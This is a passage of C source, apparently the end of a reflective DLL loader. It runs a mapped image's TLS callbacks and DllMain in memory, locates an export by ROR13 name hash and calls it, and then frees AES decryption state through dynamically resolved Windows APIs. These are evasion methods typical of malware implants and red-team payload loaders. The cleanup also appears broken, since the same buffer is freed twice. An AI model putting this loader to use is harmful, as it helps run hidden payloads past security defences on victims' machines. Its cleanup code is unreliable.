		for (; *callback; callback++) {
			(*callback)((LPVOID)pBaseAddress, DLL_PROCESS_ATTACH, NULL);
		}
	}

	///
	// STEP 10: Register exception handlers (x64 only)
	///

#ifdef _WIN64
	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (pRtlAddFunctionTable && dataDir->Size)
	{
		rfEntry = RVA(PIMAGE_RUNTIME_FUNCTION_ENTRY, pBaseAddress, dataDir->VirtualAddress);
		pRtlAddFunctionTable(rfEntry, (dataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, pBaseAddress);
	}
#endif

	///
	// STEP 11: call our images entry point
	///

	dllMain = RVA(DLLMAIN, pBaseAddress, ntHeaders->OptionalHeader.AddressOfEntryPoint);
	dllMain((HINSTANCE)pBaseAddress, DLL_PROCESS_ATTACH, (LPVOID)1);

	///
	// STEP 12: call our exported function
	///

	if (dwFunctionHash) {

		do
		{
			dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
			if (!dataDir->Size)
				break;

			exportDir = (PIMAGE_EXPORT_DIRECTORY)(pBaseAddress + dataDir->VirtualAddress);
			if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions)
				break;

			expName = RVA(PDWORD, pBaseAddress, exportDir->AddressOfNames);
			expOrdinal = RVA(PWORD, pBaseAddress, exportDir->AddressOfNameOrdinals);

			for (i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++) {

				expNameStr = RVA(LPCSTR, pBaseAddress, *expName);
				funcHash = 0;

				if (!expNameStr)
					break;

				for (; *expNameStr; expNameStr++) {
					funcHash += *expNameStr;
					funcHash = ROTR32(funcHash, 13);

				}

				if (dwFunctionHash == funcHash && expOrdinal)
				{
					exportFunc = RVA(EXPORTFUNC, pBaseAddress, *(PDWORD)(pBaseAddress + exportDir->AddressOfFunctions + (*expOrdinal * 4)));
					exportFunc(lpUserData, dwUserdataLen);
					break;
				}
			}
		} while (0);
	}

Cleanup:

	if (hAesAlg)
		pBCryptCloseAlgorithmProvider(hAesAlg, 0);

	if (hKey)
		pBCryptDestroyKey(hKey);

	if (pbIV)
		pHeapFree(pGetProcessHeap(), 0, pbIV);

	if (pbKeyObject)
		pHeapFree(pGetProcessHeap(), 0, pbKeyObject);

	if (pbRawData)
		pHeapFree(pGetProcessHeap(), 0, pbRawData);

	if (pVirtualFree && pLocalFree) {
		if (!pVirtualFree((LPVOID)pbRawData, 0, 0x8000))
			pLocalFree((LPVOID)pbRawData);
	}

	// Atempt to return a handle to the module
	return pBaseAddress;
}